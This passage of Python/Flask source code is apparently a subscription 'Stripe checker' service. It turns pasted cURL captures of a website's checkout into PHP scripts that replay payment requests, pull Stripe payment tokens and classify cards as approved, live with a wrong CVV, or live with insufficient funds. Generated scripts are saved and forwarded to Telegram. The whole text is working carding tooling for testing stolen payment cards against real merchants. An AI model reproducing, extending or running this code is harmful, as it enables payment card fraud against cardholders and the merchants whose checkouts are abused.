        p.append(f'// STEP {i+1}: {a["type"]}')
        p.append(f'curl_setopt($ch,CURLOPT_URL,"{_esc(url)}");curl_setopt($ch,CURLOPT_CUSTOMREQUEST,"{method}");')
        if headers:
            p.append(f'$h{i}=[];')
            for k, v in headers.items():
                if k.lower() in ('host','content-length'): continue
                p.append(f'$h{i}[]="{_esc(k)}: {_esc(v)}";')
            p.append(f'curl_setopt($ch,CURLOPT_HTTPHEADER,$h{i});')
        if data and method in ('POST','PUT','PATCH'):
            d = _php_data(data, all_tokens)
            p.append(f'$d{i}="{d}";curl_setopt($ch,CURLOPT_POSTFIELDS,$d{i});')
        p.append('curl_setopt($ch,CURLOPT_COOKIEFILE,$ck);curl_setopt($ch,CURLOPT_COOKIEJAR,$ck);')
        if comp: p.append('curl_setopt($ch,CURLOPT_ENCODING,"gzip, deflate, br");')
        p.append(f'$r{i}=curl_exec($ch);$c{i}=curl_getinfo($ch,CURLINFO_HTTP_CODE);')
        if a['extracts_token']:
            p.append(f'$j{i}=json_decode($r{i},true);')
            if a['token_type'] == 'pm':
                p.append(f'if(isset($j{i}["id"]))$pm_id=$j{i}["id"];')
                p.append(f'if(empty($pm_id)){{preg_match(\'/"id":\\s*"(pm_[^"]+)"/\',$r{i},$m);if(isset($m[1]))$pm_id=$m[1];}}')
            elif a['token_type'] == 'tok':
                p.append(f'if(isset($j{i}["id"]))$token_id=$j{i}["id"];')
            elif a['token_type'] == 'pi':
                p.append(f'if(isset($j{i}["id"]))$pi_id=$j{i}["id"];')
                p.append(f'if(isset($j{i}["client_secret"]))$client_secret=$j{i}["client_secret"];')
    p.append('curl_close($ch);')
    last = len(analyzed) - 1
    p.append(f'$tempo=number_format(microtime(true)-$inicio,2);')
    p.append(f'$fr=$r{last};$fc=$c{last};$fj=json_decode($fr,true);')
    p.append('$status="declined";$message="Cartao recusado";')
    p.append('if($fj){')
    p.append('  if(isset($fj["status"])&&$fj["status"]==="succeeded"){$status="approved";$message="Aprovado";}')
    p.append('  elseif(isset($fj["error"]["message"]))$message=$fj["error"]["message"];')
    p.append('  elseif(isset($fj["message"]))$message=is_array($fj["message"])?implode(" ",$fj["message"]):$fj["message"];')
    p.append('}else{')
    p.append('  if(preg_match(\'/"message":\\s*"([^"]+)"/\',$fr,$m))$message=$m[1];')
    p.append('  elseif(preg_match(\'/"error":\\s*"([^"]+)"/\',$fr,$m))$message=$m[1];')
    p.append('}')
    p.append('if(stripos($message,"succeeded")!==false||stripos($message,"approved")!==false)$status="approved";')
    p.append('if(stripos($message,"cvc")!==false||stripos($message,"cvv")!==false){$status="live_cvv";$message="LIVE - CVV INCORRETO";}')
    p.append('if(stripos($message,"insufficient")!==false||stripos($message,"funds")!==false){$status="live_insufficient";$message="LIVE - SALDO INSUFICIENTE";}')
    p.append('if(stripos($message,"expired")!==false){$status="declined_expired";$message="EXPIRADO";}')
    p.append('if(stripos($message,"3ds")!==false||stripos($message,"authentication")!==false){$status="3ds";$message="3DS NECESSARIO";}')
    p.append('echo json_encode(["status"=>$status,"message"=>$message,"card"=>$cc,"bandeira"=>$bandeira,"http_code"=>$fc,"tempo"=>$tempo]);')
    p.append('?>')
    return '\n'.join(p), analyzed, skipped, has_cart, has_checkout, has_signup, has_login, acc_mode

# ============================================================
# ROUTES
# ============================================================
@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'GET':
        if session.get('authenticated'):
            return redirect(url_for('app_page'))
        return LOGIN_PAGE
    key = request.form.get('key', '').strip()
    if not key: return redirect(url_for('login_page', error='empty'))
    if key in KEYS_RAW:
        d = KEYS_RAW[key]
        if d.get('status') == 'desativado': return redirect(url_for('login_page', error='desativado'))
        session.update(authenticated=True, user=d['user'], plano=d['plano'], expiracao=d['expiracao'], key=key)
    elif key == ADMIN_PASSWORD:
        session.update(authenticated=True, user='@hipolitoofc', plano='ADMIN', expiracao='-', key='admin')
    else:
        time.sleep(0.4)
        return redirect(url_for('login_page', error='invalid_key'))
    session.permanent = True
    return redirect(url_for('app_page'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login_page'))

@app.route('/app')
def app_page():
    if not session.get('authenticated'):
        return redirect(url_for('login_page'))
    html = APP_PAGE
    html = html.replace('USER_PLACEHOLDER', session.get('user', 'Unknown'))
    html = html.replace('PLANO_PLACEHOLDER', session.get('plano', 'N/A'))
    html = html.replace('EXP_PLACEHOLDER', session.get('expiracao', 'N/A'))
    return html

@app.route('/')
def index():
    return redirect(url_for('app_page') if session.get('authenticated') else url_for('login_page'))

@app.route('/api/generate', methods=['POST'])
@rate_limit(max_req=10, window=60)
def generate_api():
    if not session.get('authenticated'):
        return jsonify({'status': 'error', 'message': 'Nao autenticado'}), 401
    data = request.json or {}
    curls_text = (data.get('curls') or '').strip()
    if not curls_text:
        return jsonify({'status': 'error', 'message': 'Nenhum cURL fornecido'}), 400
    raw, cur = [], []
    for line in curls_text.split('\n'):
        if line.strip().startswith('curl') and cur:
            raw.append(' '.join(cur)); cur = [line]
        else:
            cur.append(line)
    if cur: raw.append(' '.join(cur))
    if not raw: raw = [curls_text]
    parsed = []; seen = set()
    for c in raw:
        p = parse_curl(c)
        if p and p['url']:
            k = (p['method'], p['url'].split('?')[0], p['data'][:100])
            if k in seen: continue
            seen.add(k); parsed.append(p)
    if not parsed:
        return jsonify({'status': 'error', 'message': 'Nenhum cURL valido'}), 400
    try:
        php, analyzed, skipped, has_cart, has_checkout, has_signup, has_login, acc_mode = \
            generate_php(parsed, ADMIN_TAG)
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'Erro: {str(e)}'}), 500
    filename = f'api_hipolito_{uuid.uuid4().hex[:8]}.php'
    with open(os.path.join('scripts_gerados', filename), 'w', encoding='utf-8') as f:
        f.write(php)
    req_info = [{'step': i+1, 'method': it['curl']['method'],
                 'url': it['curl']['url'][:100], 'purpose': it['analysis']['type']}
                for i, it in enumerate(analyzed)]
    tokens_found = list({t for it in analyzed for t in it['tokens'].keys()})
    cart_items = 0
    if has_cart:
        for it in analyzed:
            if it['analysis']['is_cart_add']:
                m = re.search(r'(?:quantity|qty)=(\d+)', it['curl']['data'])
                if m: cart_items = int(m.group(1))
    apis = load_apis()
    apis.append({
        'id': uuid.uuid4().hex[:8], 'filename': filename,
        'data': datetime.now().strftime('%d/%m/%Y %H:%M:%S'),
        'user': session.get('user', '?'), 'requests_count': len(analyzed),
        'site': re.sub(r'https?://(www\.)?', '', parsed[0]['url']).split('/')[0],
        'code': php,
    })
    save_apis(apis)
    tg_sent = False
    try:
        site = re.sub(r'https?://(www\.)?', '', parsed[0]['url']).split('/')[0]
        tg_send_doc(php.encode('utf-8'), filename,
            f"Nova API\nArquivo: {filename}\nSite: {site}\nUser: {session.get('user','?')}\nRequisicoes: {len(analyzed)}\nIgnorados: {skipped}")
        tg_sent = True
    except: pass
    return jsonify({
        'status': 'success',
        'message': f'API gerada: {len(analyzed)} requisicoes, {skipped} ignoradas.',
        'php_code': php, 'filename': filename,
        'total_requests': len(analyzed), 'requests': req_info,
        'analysis': {
            'account_mode': acc_mode, 'has_cart': has_cart, 'cart_items': cart_items,
            'has_checkout': has_checkout, 'tokens': tokens_found, 'skipped': skipped,
        },
        'usage': f'php -S localhost:8000 {filename}', 'tg_sent': tg_sent,
    })

@app.route('/ping')
def ping():
    return jsonify({'status': 'online', 'service': 'HIPOLITO-STRIPE', 'apis': len(load_apis())})

if __name__ == '__main__':
    threading.Thread(target=tg_polling, daemon=True).start()
    print(f"\n{Fore.CYAN}HIPOLITO STRIPE v6.1{Style.RESET_ALL}")
    print(f"{Fore.WHITE}http://localhost:{PORT}{Style.RESET_ALL}\n")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
